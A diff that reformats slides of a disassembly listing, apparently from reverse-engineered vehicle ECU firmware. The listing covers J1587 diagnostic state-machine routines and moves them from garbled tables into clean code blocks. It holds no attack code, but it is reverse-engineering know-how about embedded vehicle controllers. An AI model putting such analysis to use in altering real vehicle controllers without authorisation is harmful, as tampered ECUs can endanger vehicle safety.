-|**E8BCBF:**|FDCF77|**ldy**|word_CF77_; Load Y_|
-|---|---|---|---|
-|**E8BCC2:**|F6294B|**ldab**|byte_294B_; Load B_|
-|**E8BCC5:**|0F400420|**brclr**|0,y,#4,loc_E8BCE9_; Branch if selected bits clear_|
-|**E8BCC9:**|C101|**cmpb**|#1_; Compare B to memory_|
-|**E8BCCB:**|2617|**bne**|loc_E8BCE4_; Branch if not equal_|
-|**E8BCCD:**|79294B|**clr**|byte_294B_; Clear memory_|
-|**E8BCD0:**|180429452949|**movw**|word_2945,word_2949_; Move word (16-bit)_|
-|**E8BCD6:**|18792945|**clrw**|word_2945|
-|**E8BCDA:**|FC2943|**ldd**|word_2943_; Load D_|
-
-49
+```
+E8BCBF: FDCF77        ldy     word_CF77; Load Y
+E8BCC2: F6294B        ldab    byte_294B; Load B
+E8BCC5: 0F400420      brclr   0,y,#4,loc_E8BCE9; Branch if selected bits clear
+E8BCC9: C101          cmpb    #1; Compare B to memory
+E8BCCB: 2617          bne     loc_E8BCE4; Branch if not equal
+E8BCCD: 79294B        clr     byte_294B; Clear memory
+E8BCD0: 180429452949  movw    word_2945,word_2949; Move word (16-bit)
+E8BCD6: 18792945      clrw    word_2945
+E8BCDA: FC2943        ldd     word_2943; Load D
+```
 
 ## Slide 50
 
-**E8BCDD:** 7C2947 **std** word_2947 _; Store D_ **E8BCE0:** 18792943 **clrw** word_2943 **E8BCE4:** 18722945 **incw** word_2945 **E8BCE8:** 0A **rtc** _; Return from call_ **E8BCE9:** 2619 **bne** loc_E8BD04 _; Branch if not equal_ **E8BCEB:** C601 **ldab** #1 _; Load B_ **E8BCED:** 7B294B **stab** byte_294B _; Store B_ **E8BCF0:** 180429432947 **movw** word_2943,word_2947 _; Move word (16-bit)_ **E8BCF6:** 18792943 **clrw** word_2943 **E8BCFA:** 180429452949 **movw** word_2945,word_2949 _; Move word (16-bit)_ **E8BD00:** 18792945 **clrw** word_2945 **E8BD04:** 18722943 **incw** word_2943 **E8BD08:** 0A **rtc** _; Return from call_
+```
+E8BCDD: 7C2947        std     word_2947; Store D
+E8BCE0: 18792943      clrw    word_2943
+E8BCE4: 18722945      incw    word_2945
+E8BCE8: 0A            rtc; Return from call
+E8BCE9: 2619          bne     loc_E8BD04; Branch if not equal
+E8BCEB: C601          ldab    #1; Load B
+E8BCED: 7B294B        stab    byte_294B; Store B
+E8BCF0: 180429432947  movw    word_2943,word_2947; Move word (16-bit)
+E8BCF6: 18792943      clrw    word_2943
+E8BCFA: 180429452949  movw    word_2945,word_2949; Move word (16-bit)
+E8BD00: 18792945      clrw    word_2945
+E8BD04: 18722943      incw    word_2943
+E8BD08: 0A            rtc; Return from call
+```
 
 #### **sub_E8BD09** :
 
-**E8BD09:** F6294C **ldab** byte_294C _; Load B_ **E8BD0C:** 270A **beq** loc_E8BD18 _; Branch if equal_ **E8BD0E:** 04010C **dbeq** b,loc_E8BD1D _; Decrement counter and branch if = 0_ **E8BD11:** 04010E **dbeq** b,loc_E8BD22 _; Decrement counter and branch if = 0_ **E8BD14:** 040110 **dbeq** b,loc_E8BD27 _; Decrement counter and branch if = 0_ **E8BD17:** 0A **rtc** _; Return from call_ **E8BD18:** 4ABD2CE8 **call** gone_J1587_Diag_SM_State_Init_E8BD2C,#0xE8 _; Call subroutine in_ ↪ _expanded memory_ **E8BD1C:** 0A **rtc** _; Return from call_ **E8BD1D:** 4ABDFAE8 **call** gone_J1587_Diag_SM_State_Active_E8BDFA,#0xE8 _; Call subroutine in_ ↪ _expanded memory_ **E8BD21:** 0A **rtc** _; Return from call_ **E8BD22:** 4ABED9E8 **call** gone_J1587_Diag_SM_State_Transition_E8BED9,#0xE8 _; Call subroutine_ ↪ _in expanded memory_ **E8BD26:** 0A **rtc** _; Return from call_ **E8BD27:** 4A8000E9 **call** gone_J1587_Diag_SM_State_Idle_E98000,#0xE9 _; Call subroutine in_ ↪ _expanded memory_ **E8BD2B:** 0A **rtc** _; Return from call_
+```
+E8BD09: F6294C        ldab    byte_294C; Load B
+E8BD0C: 270A          beq     loc_E8BD18; Branch if equal
+E8BD0E: 04010C        dbeq    b,loc_E8BD1D; Decrement counter and branch if = 0
+E8BD11: 04010E        dbeq    b,loc_E8BD22; Decrement counter and branch if = 0
+E8BD14: 040110        dbeq    b,loc_E8BD27; Decrement counter and branch if = 0
+E8BD17: 0A            rtc; Return from call
+E8BD18: 4ABD2CE8      call    gone_J1587_Diag_SM_State_Init_E8BD2C,#0xE8; Call subroutine in
+↪   expanded memory
+E8BD1C: 0A            rtc; Return from call
+E8BD1D: 4ABDFAE8      call    gone_J1587_Diag_SM_State_Active_E8BDFA,#0xE8; Call subroutine in
+↪   expanded memory
+E8BD21: 0A            rtc; Return from call
+E8BD22: 4ABED9E8      call    gone_J1587_Diag_SM_State_Transition_E8BED9,#0xE8; Call subroutine
+↪   in expanded memory
+E8BD26: 0A            rtc; Return from call
+E8BD27: 4A8000E9      call    gone_J1587_Diag_SM_State_Idle_E98000,#0xE9; Call subroutine in
+↪   expanded memory
+E8BD2B: 0A            rtc; Return from call
+```
 
 #### **sub_E8BD2C** :
 
-**E8BD2C:** 37 **pshb** _; Push B_ **E8BD2D:** 87 clra _; Clear A_ **E8BD2E:** 6A80 **staa** 1+var_1, **sp** _; Store A_ **E8BD30:** F6294C **ldab** byte_294C _; Load B_ **E8BD33:** 59 **lsld** _; Logic shift left D_ **E8BD34:** B746 **tfr** d,y _; Transfer register to register_ **E8BD36:** ECEA2953 **ldd** 0x2953,y _; Load D_ **E8BD3A:** 2709 **beq** loc_E8BD45 _; Branch if equal_ **E8BD3C:** C601 **ldab** #1 _; Load B_ **E8BD3E:** 6B80 **stab** 1+var_1, **sp** _; Store B_ **E8BD40:** 1869EA2953 **clrw** 0x2953,y **E8BD45:** E680 **ldab** 1+var_1, **sp** _; Load B_ **E8BD47:** 6B80 **stab** 1+var_1, **sp** _; Store B_ **E8BD49:** 042106 **dbne** b,loc_E8BD52 _; Decrement counter and branch if != 0_ **E8BD4C:** 79294F **clr** word_294F _; Clear memory_ **E8BD4F:** 792940 **clr** byte_2940 _; Clear memory_ **E8BD52:** F62961 **ldab** byte_2961 _; Load B_
-
-50
+```
+E8BD2C: 37            pshb; Push B
+E8BD2D: 87            clra; Clear A
+E8BD2E: 6A80          staa    1+var_1,sp; Store A
+E8BD30: F6294C        ldab    byte_294C; Load B
+E8BD33: 59            lsld; Logic shift left D
+E8BD34: B746          tfr     d,y; Transfer register to register
+E8BD36: ECEA2953      ldd     0x2953,y; Load D
+E8BD3A: 2709          beq     loc_E8BD45; Branch if equal
+E8BD3C: C601          ldab    #1; Load B
+E8BD3E: 6B80          stab    1+var_1,sp; Store B
+E8BD40: 1869EA2953    clrw    0x2953,y
+E8BD45: E680          ldab    1+var_1,sp; Load B
+E8BD47: 6B80          stab    1+var_1,sp; Store B
+E8BD49: 042106        dbne    b,loc_E8BD52; Decrement counter and branch if != 0
+E8BD4C: 79294F        clr     word_294F; Clear memory
+E8BD4F: 792940        clr     byte_2940; Clear memory
+E8BD52: F62961        ldab    byte_2961; Load B
+```
 
 ## Slide 51
 
-|**E8BD55:**
-**E8BD57:**|2617
-C601|**bne**
-**ldab**|loc_E8BD6E_; Branch if not equal_
-#1_LoadB_|
-|---|---|---|---|
-|
-**E8BD59:**|
- 7B294F|**stab**|_;  _
-word_294F_; Store B_|
-|**E8BD5C:**|52|incb_; _|_Increment B_|
-|**E8BD5D:**|4ABC93E8|**call**|gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8_; Call subroutine in_|
-|_exp_
-↪|_anded memory_|||
-|**E8BD61:**|C601|**ldab**|#1_; Load B_|
-|**E8BD63:**|4ABCBBE8|**call**|gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8_; Call subroutine in_|
-|_exp_
-↪|_anded memory_|||
-|**E8BD67:**
-|C601
-|**ldab**
-|#1_; Load B_
-|
-|**E8BD69:**|7B2961|**stab**|byte_2961_; Store B_|
-|**E8BD6C:**|2072|**bra**|loc_E8BDE0_; Branch always_|
-|**E8BD6E:**|F6294D|**ldab**|byte_294D_; Load B_|
-|**E8BD71:**|040111|**dbeq**|b,loc_E8BD85_; Decrement counter and branch if = 0_|
-|**E8BD74:**|042169|**dbne**|b,loc_E8BDE0_; Decrement counter and branch if != 0_|
-|**E8BD77:**|F6294B|**ldab**|byte_294B_; Load B_|
-|**E8BD7A:**|042163|**dbne**|b,loc_E8BDE0_; Decrement counter and branch if != 0_|
-|**E8BD7D:**|C601|**ldab**|#1_; Load B_|
-|**E8BD7F:**|4ABCBBE8|**call**|gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8_; Call subroutine in_|
-|_exp_
-↪|_anded memory_|||
-|**E8BD83:**|205B|**bra**|loc_E8BDE0_; Branch always_|
-|**E8BD85:**|F6294B|**ldab**|byte_294B_; Load B_|
-|**E8BD88:**|260D|**bne**|loc_E8BD97_; Branch if not equal_|
-|**E8BD8A:**|C602|**ldab**|#2_; Load B_|
-|**E8BD8C:**|4ABCBBE8|**call**|gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8_; Call subroutine in_|
-|_exp_
-↪|_anded memory_|||
-|**E8BD90:**|C601|**ldab**|#1_; Load B_|
-|**E8BD92:**|7B2951|**stab**|byte_2951_; Store B_|
-|**E8BD95:**|2049|**bra**|loc_E8BDE0_; Branch always_|
-|**E8BD97:**|F62951|**ldab**|byte_2951_; Load B_|
-|**E8BD9A:**|04211A|**dbne**|b,loc_E8BDB7_; Decrement counter and branch if != 0_|
-|**E8BD9D:**|792951|**clr**|byte_2951_; Clear memory_|
-|**E8BDA0:**|F62940|**ldab**|byte_2940_; Load B_|
-|**E8BDA3:**|04213A|**dbne**|b,loc_E8BDE0_; Decrement counter and branch if != 0_|
-|**E8BDA6:**|4A8337E9|**call**|gone_J1587_Diag_Reset_Runtime_State_E98337,#0xE9_; Call subroutine_|
-|_in_
-↪|_expandedmemory_|||
-|
-
-**E8BDAA:**|
- C7|clrb_; _|_Clear B_|
-|**E8BDAB:**|4ABC93E8|**call**|gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8_; Call subroutine in_|
-|_exp_
-↪
-|_anded memory_
-|||
-|**E8BDAF:**|C601|**ldab**|#1_; Load B_|
-|**E8BDB1:**|4ABCBBE8|**call**|gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8_; Call subroutine in_|
-|_exp_
-↪|_anded memory_|||
-|**E8BDB5:**|2029|**bra**|loc_E8BDE0_; Branch always_|
-|**E8BDB7:**|F62940|**ldab**|byte_2940_; Load B_|
-|**E8BDBA:**
-**E8BDBC:**|2708
- 040124|**beq**
-**dbeq**|loc_E8BDC4_; Branch if equal_
-b,locE8BDE3_; Decrement counter and branch if = 0_|
-|**E8BDBF:**|040123|**dbeq**|_
-b,loc_E8BDE5_; Decrement counter and branch if = 0_|
-|**E8BDC2:**|201C|**bra**|locE8BDE0_;Branchalways_|
-|
-**E8BDC4:**|
- C601|**ldab**|_
-#1_; Load B_|
-|**E8BDC6:**|7B2908|**stab**|byte2908_; Store B_|
-|**E8BDC9:**|CC00FA|**ldd**|_
-#0xFA_; Load D_|
-|**E8BDCC:**|7C2909|**std**|word_2909_; Store D_|
-|**E8BDCF:**|C7|clrb_; _|_Clear B_|
-|**E8BDD0:**|7C290B|**std**|word_290B_; Store D_|
-|**E8BDD3:**|7C290D|**std**|word290D_;StoreD_|
-|
-**E8BDD6:**|
- 52|incb_; _|_
- _Increment B_|
-|**E8BDD7:**|7B2906|**stab**|byte_2906_; Store B_|
-|**E8BDDA:**|C601|**ldab**|#1_;LoadB_|
-|
-**E8BDDC:**|
- 4A834FE9|**call**|
-gone_J1587_Diag_Process_Clear_Request_E9834F,#0xE9_; Call_|
-
-↪ _subroutine in expanded memory_
-
-51
+```
+E8BD55: 2617          bne     loc_E8BD6E; Branch if not equal
+E8BD57: C601          ldab    #1; Load B
+E8BD59: 7B294F        stab    word_294F; Store B
+E8BD5C: 52            incb; Increment B
+E8BD5D: 4ABC93E8      call    gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8; Call subroutine in
+↪   expanded memory
+E8BD61: C601          ldab    #1; Load B
+E8BD63: 4ABCBBE8      call    gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8; Call subroutine in
+↪   expanded memory
+E8BD67: C601          ldab    #1; Load B
+E8BD69: 7B2961        stab    byte_2961; Store B
+E8BD6C: 2072          bra     loc_E8BDE0; Branch always
+E8BD6E: F6294D        ldab    byte_294D; Load B
+E8BD71: 040111        dbeq    b,loc_E8BD85; Decrement counter and branch if = 0
+E8BD74: 042169        dbne    b,loc_E8BDE0; Decrement counter and branch if != 0
+E8BD77: F6294B        ldab    byte_294B; Load B
+E8BD7A: 042163        dbne    b,loc_E8BDE0; Decrement counter and branch if != 0
+E8BD7D: C601          ldab    #1; Load B
+E8BD7F: 4ABCBBE8      call    gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8; Call subroutine in
+↪   expanded memory
+E8BD83: 205B          bra     loc_E8BDE0; Branch always
+E8BD85: F6294B        ldab    byte_294B; Load B
+E8BD88: 260D          bne     loc_E8BD97; Branch if not equal
+E8BD8A: C602          ldab    #2; Load B
+E8BD8C: 4ABCBBE8      call    gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8; Call subroutine in
+↪   expanded memory
+E8BD90: C601          ldab    #1; Load B
+E8BD92: 7B2951        stab    byte_2951; Store B
+E8BD95: 2049          bra     loc_E8BDE0; Branch always
+E8BD97: F62951        ldab    byte_2951; Load B
+E8BD9A: 04211A        dbne    b,loc_E8BDB7; Decrement counter and branch if != 0
+E8BD9D: 792951        clr     byte_2951; Clear memory
+E8BDA0: F62940        ldab    byte_2940; Load B
+E8BDA3: 04213A        dbne    b,loc_E8BDE0; Decrement counter and branch if != 0
+E8BDA6: 4A8337E9      call    gone_J1587_Diag_Reset_Runtime_State_E98337,#0xE9; Call subroutine
+↪   in expanded memory
+E8BDAA: C7            clrb; Clear B
+E8BDAB: 4ABC93E8      call    gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8; Call subroutine in
+↪   expanded memory
+E8BDAF: C601          ldab    #1; Load B
+E8BDB1: 4ABCBBE8      call    gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8; Call subroutine in
+↪   expanded memory
+E8BDB5: 2029          bra     loc_E8BDE0; Branch always
+E8BDB7: F62940        ldab    byte_2940; Load B
+E8BDBA: 2708          beq     loc_E8BDC4; Branch if equal
+E8BDBC: 040124        dbeq    b,loc_E8BDE3; Decrement counter and branch if = 0
+E8BDBF: 040123        dbeq    b,loc_E8BDE5; Decrement counter and branch if = 0
+E8BDC2: 201C          bra     loc_E8BDE0; Branch always
+E8BDC4: C601          ldab    #1; Load B
+E8BDC6: 7B2908        stab    byte_2908; Store B
+E8BDC9: CC00FA        ldd     #0xFA; Load D
+E8BDCC: 7C2909        std     word_2909; Store D
+E8BDCF: C7            clrb; Clear B
+E8BDD0: 7C290B        std     word_290B; Store D
+E8BDD3: 7C290D        std     word_290D; Store D
+E8BDD6: 52            incb; Increment B
+E8BDD7: 7B2906        stab    byte_2906; Store B
+E8BDDA: C601          ldab    #1; Load B
+E8BDDC: 4A834FE9      call    gone_J1587_Diag_Process_Clear_Request_E9834F,#0xE9; Call
+↪   subroutine in expanded memory
+```
 
 ## Slide 52
 
-**E8BDE0:** 1B81 **ins** _; Increment SP_ **E8BDE2:** 0A **rtc** _; Return from call_ **E8BDE3:** 20F7 **bra** loc_E8BDDC _; Branch always_ **E8BDE5:** 87 clra _; Clear A_ **E8BDE6:** 7C294F **std** word_294F _; Store D_ **E8BDE9:** 52 incb _; Increment B_ **E8BDEA:** 4ABC93E8 **call** gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8 _; Call subroutine in_ ↪ _expanded memory_ **E8BDEE:** C601 **ldab** #1 _; Load B_ **E8BDF0:** 4ABCBBE8 **call** gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8 _; Call subroutine in_ ↪ _expanded memory_ **E8BDF4:** 4ABDFAE8 **call** gone_J1587_Diag_SM_State_Active_E8BDFA,#0xE8 _; Call subroutine in_ ↪ _expanded memory_ **E8BDF8:** 20E6 **bra** loc_E8BDE0 _; Branch always_
+```
+E8BDE0: 1B81          ins; Increment SP
+E8BDE2: 0A            rtc; Return from call
+E8BDE3: 20F7          bra     loc_E8BDDC; Branch always
+E8BDE5: 87            clra; Clear A
+E8BDE6: 7C294F        std     word_294F; Store D
+E8BDE9: 52            incb; Increment B
+E8BDEA: 4ABC93E8      call    gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8; Call subroutine in
+↪   expanded memory
+E8BDEE: C601          ldab    #1; Load B
+E8BDF0: 4ABCBBE8      call    gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8; Call subroutine in
+↪   expanded memory
+E8BDF4: 4ABDFAE8      call    gone_J1587_Diag_SM_State_Active_E8BDFA,#0xE8; Call subroutine in
+↪   expanded memory
+E8BDF8: 20E6          bra     loc_E8BDE0; Branch always
+```
 
-**sub_E8BDFA** :
+#### **sub_E8BDFA** :
 
-**E8BDFA:** 37 **pshb** _; Push B_ **E8BDFB:** 87 clra _; Clear A_ **E8BDFC:** 6A80 **staa** 1+var_1, **sp** _; Store A_ **E8BDFE:** F6294C **ldab** byte_294C _; Load B_ **E8BE01:** 59 **lsld** _; Logic shift left D_ **E8BE02:** B746 **tfr** d,y _; Transfer register to register_ **E8BE04:** ECEA2953 **ldd** 0x2953,y _; Load D_ **E8BE08:** 2709 **beq** loc_E8BE13 _; Branch if equal_ **E8BE0A:** C601 **ldab** #1 _; Load B_ **E8BE0C:** 6B80 **stab** 1+var_1, **sp** _; Store B_ **E8BE0E:** 1869EA2953 **clrw** 0x2953,y **E8BE13:** E680 **ldab** 1+var_1, **sp** _; Load B_ **E8BE15:** 6B80 **stab** 1+var_1, **sp** _; Store B_ **E8BE17:** 042103 **dbne** b,loc_E8BE1D _; Decrement counter and branch if != 0_ **E8BE1A:** 79294F **clr** word_294F _; Clear memory_ **E8BE1D:** F6294D **ldab** byte_294D _; Load B_ **E8BE20:** 040110 **dbeq** b,loc_E8BE33 _; Decrement counter and branch if = 0_ **E8BE23:** 53 decb _; Decrement B_ **E8BE24:** 182600AE **lbne** loc_E8BED6 _; Long branch if not equal_ **E8BE28:** F6294B **ldab** byte_294B _; Load B_ **E8BE2B:** 53 decb _; Decrement B_ **E8BE2C:** 182600A6 **lbne** loc_E8BED6 _; Long branch if not equal_ **E8BE30:** 06BED0 **jmp** loc_E8BED0 _; Jump Address_ **E8BE33:** F6294B **ldab** byte_294B _; Load B_ **E8BE36:** 2611 **bne** loc_E8BE49 _; Branch if not equal_ **E8BE38:** C602 **ldab** #2 _; Load B_ **E8BE3A:** 4ABCBBE8 **call** gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8 _; Call subroutine in_ ↪ _expanded memory_ **E8BE3E:** 72294F **inc** word_294F _; Increment memory_ **E8BE41:** C601 **ldab** #1 _; Load B_ **E8BE43:** 7B2951 **stab** byte_2951 _; Store B_ **E8BE46:** 06BED6 **jmp** loc_E8BED6 _; Jump Address_ **E8BE49:** F62951 **ldab** byte_2951 _; Load B_ **E8BE4C:** 042118 **dbne** b,loc_E8BE67 _; Decrement counter and branch if != 0_ **E8BE4F:** 792951 **clr** byte_2951 _; Clear memory_ **E8BE52:** F62940 **ldab** byte_2940 _; Load B_ **E8BE55:** 04210F **dbne** b,loc_E8BE67 _; Decrement counter and branch if != 0_ **E8BE58:** 4A8337E9 **call** gone_J1587_Diag_Reset_Runtime_State_E98337,#0xE9 _; Call subroutine_ ↪ _in expanded memory_ **E8BE5C:** C7 clrb _; Clear B_
-
-52
+```
+E8BDFA: 37            pshb; Push B
+E8BDFB: 87            clra; Clear A
+E8BDFC: 6A80          staa    1+var_1,sp; Store A
+E8BDFE: F6294C        ldab    byte_294C; Load B
+E8BE01: 59            lsld; Logic shift left D
+E8BE02: B746          tfr     d,y; Transfer register to register
+E8BE04: ECEA2953      ldd     0x2953,y; Load D
+E8BE08: 2709          beq     loc_E8BE13; Branch if equal
+E8BE0A: C601          ldab    #1; Load B
+E8BE0C: 6B80          stab    1+var_1,sp; Store B
+E8BE0E: 1869EA2953    clrw    0x2953,y
+E8BE13: E680          ldab    1+var_1,sp; Load B
+E8BE15: 6B80          stab    1+var_1,sp; Store B
+E8BE17: 042103        dbne    b,loc_E8BE1D; Decrement counter and branch if != 0
+E8BE1A: 79294F        clr     word_294F; Clear memory
+E8BE1D: F6294D        ldab    byte_294D; Load B
+E8BE20: 040110        dbeq    b,loc_E8BE33; Decrement counter and branch if = 0
+E8BE23: 53            decb; Decrement B
+E8BE24: 182600AE      lbne    loc_E8BED6; Long branch if not equal
+E8BE28: F6294B        ldab    byte_294B; Load B
+E8BE2B: 53            decb; Decrement B
+E8BE2C: 182600A6      lbne    loc_E8BED6; Long branch if not equal
+E8BE30: 06BED0        jmp     loc_E8BED0; Jump Address
+E8BE33: F6294B        ldab    byte_294B; Load B
+E8BE36: 2611          bne     loc_E8BE49; Branch if not equal
+E8BE38: C602          ldab    #2; Load B
+E8BE3A: 4ABCBBE8      call    gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8; Call subroutine in
+↪   expanded memory
+E8BE3E: 72294F        inc     word_294F; Increment memory
+E8BE41: C601          ldab    #1; Load B
+E8BE43: 7B2951        stab    byte_2951; Store B
+E8BE46: 06BED6        jmp     loc_E8BED6; Jump Address
+E8BE49: F62951        ldab    byte_2951; Load B
+E8BE4C: 042118        dbne    b,loc_E8BE67; Decrement counter and branch if != 0
+E8BE4F: 792951        clr     byte_2951; Clear memory
+E8BE52: F62940        ldab    byte_2940; Load B
+E8BE55: 04210F        dbne    b,loc_E8BE67; Decrement counter and branch if != 0
+E8BE58: 4A8337E9      call    gone_J1587_Diag_Reset_Runtime_State_E98337,#0xE9; Call subroutine
+↪   in expanded memory
+E8BE5C: C7            clrb; Clear B
+```
 
 ## Slide 53
 
-**E8BE5D:** 4ABC93E8 **call** gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8 _; Call subroutine in_ ↪ _expanded memory_ **E8BE61:** C601 **ldab** #1 _; Load B_ **E8BE63:** 4ABCBBE8 **call** gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8 _; Call subroutine in_ ↪ _expanded memory_ **E8BE67:** FC2943 **ldd** word_2943 _; Load D_ **E8BE6A:** 8C0064 **cpd** #0x64 _; 'd'; Compare D to memory (16-bit)_ **E8BE6D:** 2354 **bls** loc_E8BEC3 _; Branch if lower or same_ **E8BE6F:** FC2949 **ldd** word_2949 _; Load D_ **E8BE72:** 8C012C **cpd** #0x12C _; Compare D to memory (16-bit)_ **E8BE75:** 224C **bhi** loc_E8BEC3 _; Branch if higher_ **E8BE77:** F6294F **ldab** word_294F _; Load B_ **E8BE7A:** 2742 **beq** loc_E8BEBE _; Branch if equal_ **E8BE7C:** C104 **cmpb** #4 _; Compare B to memory_ **E8BE7E:** 223E **bhi** loc_E8BEBE _; Branch if higher_ **E8BE80:** F62940 **ldab** byte_2940 _; Load B_ **E8BE83:** 2708 **beq** loc_E8BE8D _; Branch if equal_ **E8BE85:** 040123 **dbeq** b,loc_E8BEAB _; Decrement counter and branch if = 0_ **E8BE88:** 04012B **dbeq** b,loc_E8BEB6 _; Decrement counter and branch if = 0_ **E8BE8B:** 2049 **bra** loc_E8BED6 _; Branch always_ **E8BE8D:** 180C294F2908 **movb** word_294F,byte_2908 _; Move byte (8-bit)_ **E8BE93:** CC0032 **ldd** #0x32 _; '2'; Load D_ **E8BE96:** 7C2909 **std** word_2909 _; Store D_ **E8BE99:** 7C290B **std** word_290B _; Store D_ **E8BE9C:** 1879290D **clrw** word_290D **E8BEA0:** 792906 **clr** byte_2906 _; Clear memory_ **E8BEA3:** C601 **ldab** #1 _; Load B_ **E8BEA5:** 4A834FE9 **call** gone_J1587_Diag_Process_Clear_Request_E9834F,#0xE9 _; Call_ ↪ _subroutine in expanded memory_ **E8BEA9:** 202B **bra** loc_E8BED6 _; Branch always_ **E8BEAB:** 4A834FE9 **call** gone_J1587_Diag_Process_Clear_Request_E9834F,#0xE9 _; Call_ ↪ _subroutine in expanded memory_ **E8BEAF:** F62940 **ldab** byte_2940 _; Load B_ **E8BEB2:** C102 **cmpb** #2 _; Compare B to memory_ **E8BEB4:** 2620 **bne** loc_E8BED6 _; Branch if not equal_ **E8BEB6:** 4A8337E9 **call** gone_J1587_Diag_Reset_Runtime_State_E98337,#0xE9 _; Call subroutine_ ↪ _in expanded memory_ **E8BEBA:** C602 **ldab** #2 _; Load B_ **E8BEBC:** 200E **bra** loc_E8BECC _; Branch always_ **E8BEBE:** 044115 **tbeq** b,loc_E8BED6 _; Test counter and branch if = 0_ **E8BEC1:** 2008 **bra** loc_E8BECB _; Branch always_ **E8BEC3:** FC2949 **ldd** word_2949 _; Load D_ **E8BEC6:** 8C012C **cpd** #0x12C _; Compare D to memory (16-bit)_ **E8BEC9:** 230B **bls** loc_E8BED6 _; Branch if lower or same_ **E8BECB:** C7 clrb _; Clear B_ **E8BECC:** 4ABC93E8 **call** gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8 _; Call subroutine in_ ↪ _expanded memory_ **E8BED0:** C601 **ldab** #1 _; Load B_ **E8BED2:** 4ABCBBE8 **call** gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8 _; Call subroutine in_ ↪ _expanded memory_ **E8BED6:** 1B81 **ins** _; Increment SP_ **E8BED8:** 0A **rtc** _; Return from call_
+```
+E8BE5D: 4ABC93E8      call    gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8; Call subroutine in
+↪   expanded memory
+E8BE61: C601          ldab    #1; Load B
+E8BE63: 4ABCBBE8      call    gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8; Call subroutine in
+↪   expanded memory
+E8BE67: FC2943        ldd     word_2943; Load D
+E8BE6A: 8C0064        cpd     #0x64 ; 'd'; Compare D to memory (16-bit)
+E8BE6D: 2354          bls     loc_E8BEC3; Branch if lower or same
+E8BE6F: FC2949        ldd     word_2949; Load D
+E8BE72: 8C012C        cpd     #0x12C; Compare D to memory (16-bit)
+E8BE75: 224C          bhi     loc_E8BEC3; Branch if higher
+E8BE77: F6294F        ldab    word_294F; Load B
+E8BE7A: 2742          beq     loc_E8BEBE; Branch if equal
+E8BE7C: C104          cmpb    #4; Compare B to memory
+E8BE7E: 223E          bhi     loc_E8BEBE; Branch if higher
+E8BE80: F62940        ldab    byte_2940; Load B
+E8BE83: 2708          beq     loc_E8BE8D; Branch if equal
+E8BE85: 040123        dbeq    b,loc_E8BEAB; Decrement counter and branch if = 0
+E8BE88: 04012B        dbeq    b,loc_E8BEB6; Decrement counter and branch if = 0
+E8BE8B: 2049          bra     loc_E8BED6; Branch always
+E8BE8D: 180C294F2908  movb    word_294F,byte_2908; Move byte (8-bit)
+E8BE93: CC0032        ldd     #0x32 ; '2'; Load D
+E8BE96: 7C2909        std     word_2909; Store D
+E8BE99: 7C290B        std     word_290B; Store D
+E8BE9C: 1879290D      clrw    word_290D
+E8BEA0: 792906        clr     byte_2906; Clear memory
+E8BEA3: C601          ldab    #1; Load B
+E8BEA5: 4A834FE9      call    gone_J1587_Diag_Process_Clear_Request_E9834F,#0xE9; Call
+↪   subroutine in expanded memory
+E8BEA9: 202B          bra     loc_E8BED6; Branch always
+E8BEAB: 4A834FE9      call    gone_J1587_Diag_Process_Clear_Request_E9834F,#0xE9; Call
+↪   subroutine in expanded memory
+E8BEAF: F62940        ldab    byte_2940; Load B
+E8BEB2: C102          cmpb    #2; Compare B to memory
+E8BEB4: 2620          bne     loc_E8BED6; Branch if not equal
+E8BEB6: 4A8337E9      call    gone_J1587_Diag_Reset_Runtime_State_E98337,#0xE9; Call subroutine
+↪   in expanded memory
+E8BEBA: C602          ldab    #2; Load B
+E8BEBC: 200E          bra     loc_E8BECC; Branch always
+E8BEBE: 044115        tbeq    b,loc_E8BED6; Test counter and branch if = 0
+E8BEC1: 2008          bra     loc_E8BECB; Branch always
+E8BEC3: FC2949        ldd     word_2949; Load D
+E8BEC6: 8C012C        cpd     #0x12C; Compare D to memory (16-bit)
+E8BEC9: 230B          bls     loc_E8BED6; Branch if lower or same
+E8BECB: C7            clrb; Clear B
+E8BECC: 4ABC93E8      call    gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8; Call subroutine in
+↪   expanded memory
+E8BED0: C601          ldab    #1; Load B
+E8BED2: 4ABCBBE8      call    gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8; Call subroutine in
+↪   expanded memory
+E8BED6: 1B81          ins; Increment SP
+E8BED8: 0A            rtc; Return from call
+```
 
-**sub_E8BED9** :
-
-53
+#### **sub_E8BED9** :
 
 ## Slide 54
 
-|**E8BED9:**
-**E8BEDA:**|37
-87|**pshb**_; _
-clra|_Push B_
-_ClearA_|
-|---|---|---|---|
-|
-**E8BEDB:**|
- 6A80|_; _
-**staa**|
-1+var_1,**sp**_; Store A_|
-|**E8BEDD:**|F6294C|**ldab**|byte294C_; Load B_|
-|**E8BEE0:**|59|**lsld**_; _|_
- _Logic shift left D_|
-|**E8BEE1:**|B746|**tfr**|d,y_; Transfer register to register_|
-|**E8BEE3:**|ECEA2953|**ldd**|0x2953,y_; Load D_|
-|**E8BEE7:**|2709|**beq**|loc_E8BEF2_; Branch if equal_|
-|**E8BEE9:**|C601|**ldab**|#1_; Load B_|
-|**E8BEEB:**|6B80|**stab**|1+var_1,**sp**_; Store B_|
